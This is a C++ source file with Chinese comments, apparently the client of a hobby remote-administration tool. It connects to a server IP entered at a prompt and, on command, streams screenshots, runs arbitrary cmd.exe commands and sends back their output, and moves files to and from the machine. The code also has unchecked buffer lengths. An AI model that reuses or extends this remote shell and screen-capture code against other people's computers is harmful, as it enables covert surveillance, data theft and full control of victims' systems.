#include <iostream>
#include <winsock2.h>
#include <easyx.h>
#include <thread>
#include <fstream>
#include <string>
#include <windows.h>
#include <stdexcept>
#include <shellscalingapi.h>
#include <filesystem>
#pragma comment(lib, "shcore.lib")
#pragma comment(lib,"ws2_32.lib")
using namespace std;
bool is_viewrun = false;
bool is_connect = false;
SOCKET client_socket;   //创建client套接字，TCP协议
class Client {
public:
	//UTF8转GBK编码
    string utf8_to_gbk(const std::string& utf8_str) {
        int wide_len = MultiByteToWideChar(CP_UTF8, 0, utf8_str.c_str(), -1, nullptr, 0);
        std::wstring wide_str(wide_len, 0);
        MultiByteToWideChar(CP_UTF8, 0, utf8_str.c_str(), -1, &wide_str[0], wide_len);

        int gbk_len = WideCharToMultiByte(CP_ACP, 0, wide_str.c_str(), -1, nullptr, 0, nullptr, nullptr);
        std::string gbk_str(gbk_len, 0);
        WideCharToMultiByte(CP_ACP, 0, wide_str.c_str(), -1, &gbk_str[0], gbk_len, nullptr, nullptr);
        return gbk_str;
    }	
	//屏幕监控函数
    void screenview() {
        int size;
	//获取屏幕句柄
        HWND hwnd = GetDesktopWindow();     //获取桌面句柄
        HDC hdc = GetWindowDC(hwnd);    //获取屏幕DC
        int width = GetSystemMetrics(SM_CXSCREEN);  // 屏幕宽度（物理像素）
        int height = GetSystemMetrics(SM_CYSCREEN);
        IMAGE BackGroundImage(width,height);    //内存图像缓冲区
        HDC idc = GetImageHDC(&BackGroundImage);    //获取内存DC
	
        //DWORD* pBuffer = GetImageBuffer(&BackGroundImage);
        while (is_viewrun) {
	//保存图片
            BitBlt(idc,0,0,width,height,hdc,0,0,SRCCOPY);   //屏幕DC绘入内存DC
            saveimage(TEXT("D:\\one.jpg"),&BackGroundImage);    //保存图片
             FILE* fp = fopen("D:\\one.jpg","rb");  //打开文件
             if (fp == nullptr)continue;
             fseek(fp,0,SEEK_END);  //移动文件指针到末尾

             size = ftell(fp);  //通过获取当前指针位置偏移量来获取文件大小
             fseek(fp,0,SEEK_SET);  //移动文件指针到文件开头
             if (size <=0) {
                 fclose(fp);
                 continue;
             }
            int net_size = htonl(size);		//图片大小,将数据从小端序转换为大端序
            if (send(client_socket,(const char*)&net_size,sizeof(net_size),0) <=0) {		//发送数据
                is_connect = false;
                break;
            }
            char buffer[1024];
            while (is_viewrun) {
                int ret = fread(buffer,1,1024,fp);      //读取图片
                if (ret<=0)break;
                //发送图片
                if (send(client_socket,buffer,ret,0) <=0) {
                    is_connect=false;
                    fclose(fp);
                    goto end;
                }
            }
            fclose(fp); //释放文件资源
        }
        end:

        is_viewrun = false;
        ReleaseDC(hwnd,hdc);    //释放屏幕DC和内存DC资源
    }
	//cmd命令执行函数
    void getcmd() {
        while (true){
            char buffcommand[1024] = {0};
	        //获取命令
            if (recv(client_socket,buffcommand,1023,0)<=0) {
                break;
            }
            if (strcmp(buffcommand,"exitcmd")==0) {
                break;
            }
            string command = "cmd.exe /c chcp 65001 >nul &&" + string(buffcommand);

            HANDLE hReadPipe,hWritePipe;
            SECURITY_ATTRIBUTES sa={0};
            sa.nLength=sizeof(SECURITY_ATTRIBUTES);
            sa.lpSecurityDescriptor=NULL;
            sa.bInheritHandle=TRUE;
            if (!CreatePipe(&hReadPipe,&hWritePipe,&sa,0)) {
                throw runtime_error("createpipe fail");
            }
            SetHandleInformation(hReadPipe,HANDLE_FLAG_INHERIT,0);
            STARTUPINFOW si = {0};
            PROCESS_INFORMATION pi = {0};
            si.cb=sizeof(STARTUPINFOW);
            si.hStdOutput=hWritePipe;
            si.hStdError=hWritePipe;
            si.dwFlags |=STARTF_USESTDHANDLES;
            wstring wcmd = wstring(command.begin(), command.end());
            wchar_t* cmdLine = const_cast<wchar_t*>(wcmd.c_str());  //移除const修饰
            BOOL success = CreateProcessW(		//创建子进程
                NULL,
                cmdLine,
                NULL,
                NULL,
                TRUE,
                0,
                NULL,
                NULL,
                &si,
                &pi
            );
            if (!success) {
                CloseHandle(hReadPipe);
                CloseHandle(hWritePipe);
                continue;

            }
            CloseHandle(hWritePipe);
            string output;
            char buffer[4096] = {0};
            DWORD bytesRead;
            while (ReadFile(hReadPipe,buffer,sizeof(buffer)-1,&bytesRead,NULL)&& bytesRead>0) {
                output.append(buffer, bytesRead);
                memset(buffer,0,sizeof(buffer));
            }

            int net_size = htonl(output.size());    //命令返回信息大小
            if (send(client_socket,(const char*)&net_size,sizeof(net_size),0)<=0) {	//发送返回的信息大小
                break;
            }
            if (send(client_socket,output.c_str(),output.size(),0)<=0) {	//发送命令返回
                break;
            }
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
            CloseHandle(hReadPipe);
        }
    }
	//文件上传函数
    void upload() {
	//文件大小
        unsigned int path_len;      //路径字符串长度
        int ret = recv(client_socket, (char*)&path_len, sizeof(path_len), 0);
        if (ret != sizeof(path_len)) {
            return;
        }
        path_len = ntohl(path_len);
        char buffpath[1024];
	//文件路径
        if (recv(client_socket,buffpath,path_len,0)>0) {
            buffpath[path_len]='\0';
            unsigned int filesize;      //文件大小
            string path(buffpath);
            if (recv(client_socket,(char*)&filesize,sizeof(int),0)>0) {
                filesize = ntohl(filesize);     //将网络字节序转化为当前主机字节序
                int remaining = filesize;
                path = utf8_to_gbk(path);
                ofstream out(path,ios::out|ios::binary);
                if (out.is_open()) {
                    while (remaining>0) {
                        char buff[4096];
                        int rel = recv(client_socket,buff,remaining<4096?remaining:4096,0);		//接收文件
                        if (rel>0) {
                            remaining-=rel;
                            out.write(buff,rel);
                        }else {
                            break;
                        }
                    }
                }
                out.close();
                }
            }
    }
	//文件下载函数
    void download() {
        unsigned int path_len;      //文件路径长度
        int ret = recv(client_socket,(char*)&path_len,sizeof(path_len),0);
        if (ret != sizeof(path_len)) {
            return;
        }
        path_len = ntohl(path_len);     //转化为主机字节序
        char buffpath[1024];
        if (recv(client_socket,buffpath,path_len,0)>0) {
            buffpath[path_len]='\0';
        }
        string path(buffpath);
        path = utf8_to_gbk(path);       //将文件路径编码格式转换成GBK
        ifstream in(path,ios::in|ios::binary);
        if (in.is_open()) {
            in.seekg(0,ios::end);
            long long filesize = in.tellg();
            int size = htonl(filesize);
            in.seekg(0,ios::beg);
            if (send(client_socket,(char*)&size,sizeof(size),0)<0) {
                in.close();
                return;
            }
            char filebuff[4096];
            int remaining = filesize;
            while (remaining>0) {
                in.read(filebuff,remaining<4096?remaining:4096);
                int rel = in.gcount();
                if (rel<=0)break;
                remaining-=rel;
                if (send(client_socket,filebuff,rel,0)<=0)break;	//发送文件
            }
            in.close();
        }
    }
    //弹窗函数
    void showwindow(const char* command) {
        char display_string[strlen(command)-10]={'\0'};
        strncpy(display_string,command+11,strlen(command)-11);
        MessageBox(NULL,display_string,"Window",MB_OK);
    }
};



int main() {
    SetProcessDPIAware();
    WSADATA wsadata;
    WSAStartup(MAKEWORD(2,2),&wsadata);
    client_socket = socket(AF_INET,SOCK_STREAM,0);
    //IPV4套接字结构配置
    sockaddr_in server_in;
    server_in.sin_family = AF_INET;
    server_in.sin_port=htons(8080);
    string connect_ip;
    cout << "Please Enter IP: ";
    getline(cin,connect_ip);
    server_in.sin_addr.s_addr = inet_addr(connect_ip.c_str());
    Client* client = new Client();
    if (connect(client_socket, (SOCKADDR*)&server_in, sizeof(server_in)) == SOCKET_ERROR) {
        cout << "连接失败，错误码：" << WSAGetLastError() << endl;
        closesocket(client_socket);
        WSACleanup();
        delete client;
        return 1;
    }

    is_connect = true;

    while (is_connect) {

        int commandsize;
        if (recv(client_socket,(char*)&commandsize,sizeof(int),0)>0){
            commandsize = ntohl(commandsize);
            char buffcommand[1024];
            if (recv(client_socket,buffcommand,commandsize,0)>0) {
                buffcommand[commandsize]='\0';
	            //判断指令类型
                if (strcmp(buffcommand, "screenview") == 0) {
                    is_viewrun=true;
                    thread t1(&Client::screenview,client);		    //创建线程
                    t1.detach();    //启动线程
                }else if (strcmp(buffcommand, "exitsv") == 0 && is_viewrun) {
                    is_viewrun = false;
                }
                if (strcmp(buffcommand, "getcmd") == 0) {
                    client->getcmd();
                }
                if (strstr(buffcommand,"showwindow")!=NULL) {
                    client->showwindow(buffcommand);
                }
                if (strcmp(buffcommand,"upload")==0) {
                    client->upload();
                }
                if (strcmp(buffcommand,"download")==0) {
                    client->download();
                }
                if (strcmp(buffcommand,"quit")==0) {
                    is_connect=false;
                    break;
                }
            }else {
                is_connect=false;
                break;
            }
        }else {
            is_connect=false;
            break;
        }

    }


    delete client;
    closesocket(client_socket);
    WSACleanup();
    return 0;
}